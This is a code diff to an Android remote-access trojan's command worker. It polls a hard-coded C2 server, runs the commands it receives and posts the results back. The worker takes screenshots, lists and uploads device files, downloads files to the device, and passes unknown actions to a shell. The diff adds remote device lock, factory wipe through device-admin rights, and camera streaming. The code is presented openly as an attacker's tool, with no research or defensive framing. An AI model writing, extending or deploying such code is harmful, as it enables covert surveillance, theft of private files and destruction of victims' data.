@@ -1,5 +1,7 @@
 package com.riqel.cybertool
 
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Context
 import android.os.Handler
 import android.os.Looper
@@ -9,7 +11,7 @@ import com.google.gson.Gson
 import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.RequestBody.Companion.asRequestBody
-import okhttp3.ResponseBody
+import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
 import java.io.FileOutputStream
 import java.util.concurrent.TimeUnit
@@ -20,7 +22,7 @@ class CommandWorker(context: Context, params: WorkerParameters) : Worker(context
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
     private val gson = Gson()
-    private val C2_BASE = "http://100.102.225.113:5000"  // Update
+    private val C2_BASE = "http://100.102.225.113:5000"  // Update with your C2 IP
     private val deviceId = applicationContext.contentResolver.getDeviceId() ?: "unknown"
     private lateinit var db: AppDatabase
     private var webSocket: WebSocket? = null
@@ -28,13 +30,13 @@ class CommandWorker(context: Context, params: WorkerParameters) : Worker(context
     override fun doWork(): Result {
         db = AppDatabase.getInstance(applicationContext)
         runBlocking {
-            // 1. Process any pending commands from local database
+            // Process local pending commands
             db.commandDao().getPendingCommands().firstOrNull()?.forEach { cmd ->
                 executeAndReport(cmd)
             }
-            // 2. Fetch new command from C2
+            // Fetch new command from C2
             fetchNewCommand()
-            // 3. Establish WebSocket for live logs
+            // Connect WebSocket for live logs
             connectWebSocket()
         }
         return Result.success()
@@ -61,21 +63,22 @@ class CommandWorker(context: Context, params: WorkerParameters) : Worker(context
     }
 
     private suspend fun executeAndReport(cmd: QueuedCommand) {
-        val argsMap = gson.fromJson<Map<String, String>>(cmd.args, Map::class.java) as Map<String, String>
+        val argsMap = try { gson.fromJson<Map<String, String>>(cmd.args, Map::class.java) ?: emptyMap() } catch (e: Exception) { emptyMap() }
         val result = when (cmd.action) {
             "screenshot" -> takeScreenshot()
-            "upload_logs" -> uploadAllLogs()
+            "upload_logs" -> "Manual upload triggered (use DataUploadWorker)"
             "list_files" -> listFiles(argsMap["path"] ?: "/sdcard")
             "upload_file" -> uploadFile(argsMap["path"] ?: "")
             "download_file" -> downloadFile(argsMap["url"] ?: "", argsMap["dest"] ?: "")
-            "toast" -> showToast(argsMap["message"] ?: "")
-            "websocket_test" -> "WebSocket message sent"
+            "toast" -> showToast(argsMap["message"] ?: "No message")
+            "lock" -> lockDevice()
+            "wipe" -> wipeDevice()
+            "start_camera" -> startCameraStream()
+            "stop_camera" -> stopCameraStream()
             else -> executeShell(cmd.action)
         }
-        // Update status in DB
         cmd.status = "done"
         db.commandDao().update(cmd)
-        // Send result to C2
         sendResult(cmd.commandId, result)
     }
 
@@ -83,7 +86,7 @@ class CommandWorker(context: Context, params: WorkerParameters) : Worker(context
         val body = gson.toJson(mapOf("id" to cmdId, "output" to output))
         val request = Request.Builder()
             .url("$C2_BASE/api/result/$deviceId")
-            .post(RequestBody.create(MediaType.parse("application/json"), body))
+            .post(body.toRequestBody(MediaType.parse("application/json")))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {}
@@ -109,12 +112,6 @@ class CommandWorker(context: Context, params: WorkerParameters) : Worker(context
         }
         latch.await(10, TimeUnit.SECONDS)
         return result
-    }
-
-    private fun uploadAllLogs(): String {
-        // Trigger the existing DataUploadWorker to send all telemetry now
-        WorkManager.getInstance(applicationContext).enqueue(OneTimeWorkRequestBuilder<DataUploadWorker>().build())
-        return "Upload triggered"
     }
 
     private fun listFiles(path: String): String {
@@ -146,11 +143,8 @@ class CommandWorker(context: Context, params: WorkerParameters) : Worker(context
             if (response.isSuccessful) {
                 val destFile = File(destPath)
                 destFile.parentFile?.mkdirs()
-                val body = response.body ?: return "Empty response"
-                body.byteStream().use { input ->
-                    FileOutputStream(destFile).use { output ->
-                        input.copyTo(output)
-                    }
+                response.body?.byteStream()?.use { input ->
+                    FileOutputStream(destFile).use { output -> input.copyTo(output) }
                 }
                 "Downloaded to $destPath (${destFile.length()} bytes)"
             } else "Download failed: ${response.code}"
@@ -164,6 +158,38 @@ class CommandWorker(context: Context, params: WorkerParameters) : Worker(context
         return "Toast shown"
     }
 
+    private fun lockDevice(): String {
+        val dpm = applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val adminName = ComponentName(applicationContext, DeviceAdminReceiver::class.java)
+        return if (dpm.isAdminActive(adminName)) {
+            dpm.lockNow()
+            "Device locked"
+        } else {
+            "Device admin not active – cannot lock"
+        }
+    }
+
+    private fun wipeDevice(): String {
+        val dpm = applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val adminName = ComponentName(applicationContext, DeviceAdminReceiver::class.java)
+        return if (dpm.isAdminActive(adminName)) {
+            dpm.wipeData(0)
+            "Factory reset initiated"
+        } else {
+            "Device admin not active – cannot wipe"
+        }
+    }
+
+    private fun startCameraStream(): String {
+        CameraStreamService.startStream(applicationContext)
+        return "Camera stream started"
+    }
+
+    private fun stopCameraStream(): String {
+        CameraStreamService.stopStream(applicationContext)
+        return "Camera stream stopped"
+    }
+
     private fun connectWebSocket() {
         val wsUrl = C2_BASE.replace("http", "ws") + "/ws/$deviceId"
         val wsClient = object : WebSocketListener() {
@@ -172,8 +198,7 @@ class CommandWorker(context: Context, params: WorkerParameters) : Worker(context
                 webSocket.send("Connected from device $deviceId")
             }
             override fun onMessage(webSocket: WebSocket, text: String) {
-                // Handle incoming WebSocket message as a command (optional)
-                println("WS message: $text")
+                // handle incoming ws messages as commands if needed
             }
         }
         client.newWebSocket(Request.Builder().url(wsUrl).build(), wsClient)
